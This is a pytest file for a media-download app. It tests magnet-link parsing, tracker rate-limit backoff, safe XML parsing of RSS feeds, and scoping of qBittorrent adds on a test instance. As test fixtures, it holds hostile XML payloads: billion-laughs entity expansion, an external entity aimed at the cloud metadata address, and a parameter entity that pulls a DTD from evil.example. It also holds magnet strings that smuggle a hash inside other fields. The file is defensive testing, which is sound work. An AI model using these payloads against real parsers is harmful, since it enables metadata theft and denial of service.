"""v171+ Reviewer on 607f36a (same non-step-4 commit as the coverage guard). Fakes only.

2) One magnet parser for TV and movie (app.magnet.btih): anchored xt, whole value, one btih only.
3) AvistaZ: an id 400 whose body talks about rates, limits or the sign-in keeps the strict backoff.
4) The kiosk news RSS may carry a DOCTYPE (RSS 0.91); entities and external fetches stay refused;
   every tracker and Plex parse keeps forbid_dtd.
5) A movie add on LUMA_INSTANCE=test is the 'movie_grab' job and goes through instance.scoped_add
   with the test tag as category and tag, like TV. Prod is unchanged.
"""
import ast
import base64
import pathlib
import socket
from urllib.parse import parse_qs, urlsplit

import pytest
import requests
from requests.adapters import HTTPAdapter

import app.main
from app import instance, magnet, safe_xml, tracker_clients, tv_grab
from app.tracker_guard import guard_key
from app.tracker_http import TrackerError
from tests.test_downloads_add_ssrf import (PUBLIC, TORRENT, _owner_client, _post, _require_auth_everywhere,  # noqa: F401
                                           client, net, qbit)
from tests.test_tracker_search import R, env  # noqa: F401
from tests.test_v170_fixforwards import _gets, avz  # noqa: F401

APP = pathlib.Path(__file__).resolve().parents[1] / 'app'
H = 'ab' * 20
H2 = 'cd' * 20
B32 = base64.b32encode(bytes.fromhex(H)).decode()


# ------------------------------------------------------------------ 2) one shared magnet parser

GOOD = [
    ('magnet:?xt=urn:btih:' + H, H),
    ('magnet:?xt=urn:btih:' + H.upper() + '&dn=Heat.1995', H),
    ('MAGNET:?XT=URN:BTIH:' + H, H),
    ('magnet:?dn=Heat&tr=udp%3A%2F%2Ft.example%3A80&xt=urn:btih:' + H, H),
    ('magnet:?xt=urn:btih:' + B32, H),                                   # base32 ok
    ('magnet:?xt=urn:btih:' + B32.lower() + '&dn=x', H),
    ('magnet:?xt=urn:btih:' + H + '&xt=urn:btmh:1220' + 'ef' * 32, H),     # hybrid: one btih
]
BAD = [
    'magnet:?xt=urn:btih:' + H + '-zz',
    'magnet:?xt=urn:btih:' + H + '%20zz',
    'magnet:?xt=urn:btih:' + H + ';x',
    'magnet:?xt=urn:btih:' + H + '#x',
    'magnet:?xt=urn:btih:' + H + '.x',
    'magnet:?dn=xt=urn:btih:' + H,                                       # xt inside dn=
    'magnet:?dn=Heat%26xt%3Durn%3Abtih%3A' + H,                          # encoded inside dn=
    'magnet:?tr=http://t.example/announce?xt=urn:btih:' + H,             # xt inside tr=
    'magnet:?tr=http%3A%2F%2Ft.example%2F%3Fxt%3Durn%3Abtih%3A' + H,
    'magnet:?xt=urn:btih:' + H + '&xt=urn:btih:' + H2,                   # two different xt values
    'magnet:?xt.1=urn:btih:' + H + '&xt.2=urn:btih:' + H2,
    'magnet:?xt=urn:btih:' + H + '&xt=urn:btih:zz',                      # a second (bad) btih still counts
    'magnet:?xt=urn:btmh:1220' + 'ef' * 32,                              # v2-only (btmh) refused
    'magnet:?xt=urn:btih:' + 'z' * 40,
    'magnet:?xt=urn:btih:' + H[:39],
    'magnet:?dn=Heat',
    'http://t.example/?xt=urn:btih:' + H,                               # not a magnet
    '',
    None,
]


@pytest.mark.parametrize('m,want', GOOD)
def test_good_magnets_parse(m, want):
    assert magnet.btih(m) == want


@pytest.mark.parametrize('m', BAD)
def test_bad_magnets_are_refused(m):
    assert magnet.btih(m) is None


@pytest.mark.parametrize('m', [g[0] for g in GOOD] + BAD)
def test_tv_and_movie_use_the_same_parser(m):
    assert tv_grab.info_hash('magnet', m) == app.main._magnet_info_hash(m) == magnet.btih(m)


def test_no_other_btih_regex_in_the_app():
    """The anchored parser lives only in app/magnet.py; nothing else pattern-matches a btih."""
    offenders = []
    for f in APP.rglob('*.py'):
        if f.name == 'magnet.py':
            continue
        for node in ast.walk(ast.parse(f.read_text(encoding='utf-8'))):
            if isinstance(node, ast.Constant) and isinstance(node.value, str) and 'btih:(' in node.value:
                offenders.append(f'{f.name}:{node.lineno}')
    assert offenders == []


@pytest.mark.parametrize('m', [
    'magnet:?xt=urn:btih:' + H + '&xt=urn:btih:' + H2,
    'magnet:?xt=urn:btih:' + H + '-zz',
    'magnet:?xt=urn:btmh:1220' + 'ef' * 32,
])
def test_movie_grab_refuses_them_before_qbit(client, net, qbit, m):  # noqa: F811
    _require_auth_everywhere()
    _owner_client(client)
    r = _post(client, m)
    assert r.status_code == 400
    assert qbit.added == [] and qbit.logins == 0


# ------------------------------------------------------------------ 3) throttle words keep the backoff

@pytest.mark.parametrize('body', [
    'Rate limit exceeded for imdb lookups, unknown client',
    'Invalid request: too many IMDb searches',
    'Invalid token for imdb search',
    'imdb id lookups throttled: slow down',
])
def test_a_throttle_body_on_an_id_search_backs_off(avz, body):  # noqa: F811
    env, cfg = avz
    env['mock'].set('avz.example', R(body={'token': 'tok', 'expiry': 3600}), R(400, body={'message': body}))
    with pytest.raises(TrackerError):
        env['engine'].search_one(cfg, 'Heat', [2000], 10, True, imdb_id='tt0113277')
    assert len(_gets(env)) == 1                                       # no title fallback
    cd = env['guard'].blocked(guard_key(cfg))
    assert cd and cd[1] == 'rate'                                     # the strict backoff stands
    assert not tracker_clients.avz_id_rejected(cfg, 'imdb', 'tt0113277', 'Heat')


# ------------------------------------------------------------------ 4) news RSS 0.91 DOCTYPE

RSS091 = b"""<?xml version="1.0"?>
<!DOCTYPE rss PUBLIC "-//Netscape Communications//DTD RSS 0.91//EN"
  "http://my.netscape.com/publish/formats/rss-0.91.dtd">
<rss version="0.91"><channel><title>Old news</title>
<item><title>Headline one</title><link>https://news.example/1</link></item>
<item><title>Headline two</title><link>https://news.example/2</link></item>
</channel></rss>"""
LAUGHS = b"""<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY a "aaaaaaaaaa"><!ENTITY b "&a;&a;&a;&a;&a;">]>
<rss><channel><item><title>&b;</title></item></channel></rss>"""
EXTERNAL = b"""<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY x SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<rss><channel><item><title>&x;</title></item></channel></rss>"""
PARAM = b"""<?xml version="1.0"?><!DOCTYPE rss [<!ENTITY % p SYSTEM "http://evil.example/p.dtd"> %p;]>
<rss><channel><item><title>x</title></item></channel></rss>"""


@pytest.fixture
def no_network(monkeypatch):
    def refuse(*a, **k):
        raise AssertionError('no network while parsing')
    monkeypatch.setattr(socket, 'create_connection', refuse)
    monkeypatch.setattr(socket.socket, 'connect', refuse)


def test_news_parser_takes_an_rss091_doctype(no_network):
    root = safe_xml.fromstring_news(RSS091)
    assert [i.findtext('title') for i in root.iter('item')] == ['Headline one', 'Headline two']


@pytest.mark.parametrize('doc', [LAUGHS, EXTERNAL, PARAM])
def test_news_parser_still_refuses_entities_and_external_fetches(no_network, doc):
    with pytest.raises(safe_xml.ParseError):
        safe_xml.fromstring_news(doc)


@pytest.mark.parametrize('doc', [RSS091, LAUGHS, EXTERNAL, PARAM])
def test_tracker_and_plex_parses_keep_forbid_dtd(no_network, doc):
    with pytest.raises(safe_xml.ParseError):
        safe_xml.fromstring(doc)


def test_only_the_news_route_uses_the_dtd_tolerant_parser():
    users = []
    for f in APP.rglob('*.py'):
        if f.name == 'safe_xml.py':
            continue
        tree = ast.parse(f.read_text(encoding='utf-8'))
        for fn in ast.walk(tree):
            if isinstance(fn, (ast.FunctionDef, ast.AsyncFunctionDef)):
                for node in ast.walk(fn):
                    if isinstance(node, ast.Attribute) and node.attr == 'fromstring_news':
                        users.append((f.name, fn.name))
            elif isinstance(fn, ast.ImportFrom) and any(a.name == 'fromstring_news' for a in fn.names):
                users.append((f.name, 'import'))
    assert sorted(set(users)) == [('main.py', 'get_news')]


def test_news_route_reads_an_rss091_feed(client, monkeypatch):  # noqa: F811
    app.main._news_cache.clear()
    app.main.settings.update({'ui': {'daily_kiosk': {'news': {'enabled': True, 'feed_url': 'https://news.example/rss',
                                                               'feed_name': 'Old news'}}}})

    from app import outbound_guard
    seen = []

    def fetch(url, **k):                                  # v173: the feed goes through outbound_guard.fetch
        seen.append(url)
        return outbound_guard.Response(url, 200, {}, RSS091)
    monkeypatch.setattr(outbound_guard, 'fetch', fetch)
    monkeypatch.setattr(requests, 'get', lambda *a, **k: pytest.fail('news must not use requests.get'))
    c = _owner_client(client)
    r = c.get('/api/news', environ_base={'REMOTE_ADDR': '192.168.1.20'})
    assert r.status_code == 200, r.get_data(as_text=True)
    titles = [i.get('title') for i in (r.get_json().get('items') or r.get_json().get('headlines') or [])]
    assert titles[:2] == ['Headline one', 'Headline two']
    assert seen == ['https://news.example/rss']
    app.main._news_cache.clear()


# ------------------------------------------------------------------ 5) movie adds on test are scoped

class QbitAdapter(HTTPAdapter):
    """A fake qBittorrent behind a real requests.Session, so the instance write guard sees every request."""

    def __init__(self):
        super().__init__()
        self.sent, self.added, self.torrents = [], [], []
        self.next_hash = H

    def send(self, request, **kw):
        u = urlsplit(request.url)
        self.sent.append((request.method, u.path))
        body, js = b'Ok.', None
        if u.path.endswith('/torrents/add'):
            fields = dict((k, v) for k, v in (instance._fields(request) or []))
            self.added.append(fields)
            self.torrents.append({'hash': self.next_hash, 'added_on': 1, 'category': fields.get('category'),
                                  'tags': fields.get('tags') or ''})
        elif u.path.endswith('/torrents/info'):
            cat = (parse_qs(u.query).get('category') or [None])[0]
            js = [t for t in self.torrents if cat is None or t['category'] == cat]
        resp = requests.Response()
        resp.status_code, resp.url, resp.request = 200, request.url, request
        import json as _json
        resp._content = _json.dumps(js).encode() if js is not None else body
        resp.headers['Content-Type'] = 'application/json' if js is not None else 'text/plain; charset=UTF-8'
        return resp


@pytest.fixture
def test_qbit(test_app, monkeypatch):
    """LUMA_INSTANCE=test with the real write guard on a real requests.Session (fake transport)."""
    import sys
    import time
    import types
    monkeypatch.setenv('LUMA_INSTANCE', 'test')
    monkeypatch.delenv('LUMA_TEST_ALLOW', raising=False)
    monkeypatch.delenv('LUMA_TEST_QBIT_TAG', raising=False)
    real_session = requests.Session
    instance.install_write_guard()
    adapter = QbitAdapter()

    def make():
        s = real_session()
        s.mount('http://', adapter)
        return s
    monkeypatch.setattr(requests, 'Session', make)
    fake = types.ModuleType('app.auto_rename')
    fake.auto_renamer = types.SimpleNamespace(track_download=lambda *a, **k: None)
    monkeypatch.setitem(sys.modules, 'app.auto_rename', fake)
    monkeypatch.setattr(app.main, '_record_origin', lambda *a, **k: None)
    monkeypatch.setattr(time, 'sleep', lambda s: None)
    app.main.settings.update({'qbittorrent': {'url': 'http://qbit.test', 'username': 'u', 'password': 'p',
                                              'app_category': 'luma'}})
    yield adapter
    requests.Session = real_session
    instance.uninstall_write_guard()


def _owner(client):  # noqa: F811
    _require_auth_everywhere()
    return _owner_client(client)


def test_endpoint_job_is_movie_grab():
    assert instance.endpoint_job('POST', '/api/downloads/add') == 'movie_grab'
    assert 'movie_grab' in instance.GATED


def test_movie_add_on_test_is_off_by_default_and_contacts_nothing(client, net, test_qbit):  # noqa: F811
    _owner(client)
    r = _post(client, 'magnet:?xt=urn:btih:' + H)
    assert r.status_code == 403 and r.get_json()['error'] == 'Grabs are off on the test instance'
    assert test_qbit.sent == [] and net.opens == []


@pytest.mark.parametrize('allow', ['movie_grab', 'movie_grab,qbit'])
def test_movie_add_on_test_is_scoped_to_the_test_tag(client, net, test_qbit, monkeypatch, allow):  # noqa: F811
    monkeypatch.setenv('LUMA_TEST_ALLOW', allow)
    _owner(client)
    r = _post(client, 'magnet:?xt=urn:btih:' + H)
    assert r.status_code == 200, r.get_json()
    assert test_qbit.added == [{'urls': 'magnet:?xt=urn:btih:' + H, 'category': 'luma-test', 'tags': 'luma-test',
                                'autoTMM': 'false'}]
    # the confirm poll reads the test category, never production's
    assert ('GET', '/api/v2/torrents/info') in test_qbit.sent


def test_a_torrent_file_add_on_test_is_scoped_too(client, net, test_qbit, monkeypatch):  # noqa: F811
    monkeypatch.setenv('LUMA_TEST_ALLOW', 'movie_grab')
    monkeypatch.setenv('LUMA_TEST_QBIT_TAG', 'luma-test-movies')
    _owner(client)
    net.dns['tracker.example'] = [[PUBLIC]]
    net.routes[(PUBLIC, 'tracker.example', '/dl/1')] = (200, {'Content-Type': 'application/x-bittorrent'}, TORRENT)
    test_qbit.next_hash = app.main._torrent_info_hash(TORRENT)
    r = _post(client, 'https://tracker.example/dl/1')
    assert r.status_code == 200, r.get_json()
    (fields,) = test_qbit.added
    assert fields['category'] == fields['tags'] == 'luma-test-movies' and fields['torrents'] is None


def test_the_guard_refuses_a_movie_add_outside_the_test_tag(test_qbit, monkeypatch):
    """Even inside the movie scope, an add to production's category (or untagged) never leaves the box."""
    monkeypatch.setenv('LUMA_TEST_ALLOW', 'movie_grab')
    s = requests.Session()
    with instance.scoped_add('movie_grab', 'luma-test'):
        for data in ({'urls': 'magnet:?xt=urn:btih:' + H, 'category': 'luma', 'tags': 'luma-test', 'autoTMM': 'false'},
                     {'urls': 'magnet:?xt=urn:btih:' + H, 'category': 'luma-test', 'autoTMM': 'false'},
                     {'urls': 'magnet:?xt=urn:btih:' + H, 'category': 'luma-test', 'tags': 'luma-test',
                      'autoTMM': 'false', 'savepath': '/movies'}):
            with pytest.raises(instance.WritesBlocked):
                s.post('http://qbit.test/api/v2/torrents/add', data=data)
    monkeypatch.delenv('LUMA_TEST_ALLOW')
    with instance.scoped_add('movie_grab', 'luma-test'):                # job off: the scope opens nothing
        with pytest.raises(instance.WritesBlocked):
            s.post('http://qbit.test/api/v2/torrents/add', data={'urls': 'magnet:?xt=urn:btih:' + H,
                                                                 'category': 'luma-test', 'tags': 'luma-test',
                                                                 'autoTMM': 'false'})
    assert test_qbit.added == []


def test_a_write_guard_refusal_is_a_403_not_a_client_error(client, net, test_qbit, monkeypatch):  # noqa: F811
    monkeypatch.setenv('LUMA_TEST_ALLOW', 'movie_grab')
    _owner(client)
    monkeypatch.setattr(app.main, '_qbit_add_fields', lambda: {'category': 'x', 'autoTMM': 'false',
                                                               'savepath': '/movies'})
    r = _post(client, 'magnet:?xt=urn:btih:' + H)
    assert r.status_code == 403 and r.get_json()['error'] == 'Grabs are off on the test instance'
    assert test_qbit.added == []


def test_prod_movie_add_is_unchanged(client, net, test_qbit, monkeypatch):  # noqa: F811
    monkeypatch.setenv('LUMA_INSTANCE', 'prod')
    _owner(client)
    r = _post(client, 'magnet:?xt=urn:btih:' + H)
    assert r.status_code == 200, r.get_json()
    assert test_qbit.added == [{'urls': 'magnet:?xt=urn:btih:' + H, 'category': 'luma', 'autoTMM': 'false'}]
